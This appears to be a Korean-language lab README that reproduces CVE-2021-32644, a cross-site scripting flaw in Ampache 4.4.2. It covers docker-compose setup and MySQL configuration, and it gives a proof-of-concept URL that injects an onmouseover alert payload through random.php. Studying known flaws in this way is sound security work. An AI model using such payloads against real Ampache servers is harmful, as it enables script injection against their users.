# CVE-2021-32644
위 취약점은 Ampache 4.4.3 이전 버전까지 영향을 주었던 XSS 취약점입니다. 
https://nvd.nist.gov/vuln/detail/CVE-2021-32644
# 설치 및 실행 순서

#### 1. Ampache 설치
설치를 진행할 때, docker-compose.yml 파일에서 포트포워딩을 진행해주시기 바랍니다. 
현재 설치하는 Ampache 버전은 4.4.2 입니다.
<pre> $docker-compose up  </pre>

#### 2. Amapache 접속 
http://[web-server ip]:port/로 이동합니다.

#### 2. Amapache 접속 & mysql setting
http://[web-server ip]:port/로 이동합니다.
아래 사진과 같이 mysql DB를 세팅합니다. 
![image](https://user-images.githubusercontent.com/43310843/129431992-103a6e22-00d8-4497-8805-b8d657f169f6.png)

#### 3. PoC
아래 PoC를 삽입하면 XSS 취약점이 발생하는 것을 볼 수 있습니다. 
<pre> http://[ip]:port/random.php?action=get_advanced&type=%27%22%20onmouseover%3dalert(0x0002DE)%20</pre>
![image](https://user-images.githubusercontent.com/43310843/129432044-3aa41c0a-ded6-432f-97ee-f290dfc2f401.png)



#### 출처
https://packetstormsecurity.com/files/163620/Ampache-4.4.2-Cross-Site-Scripting.html
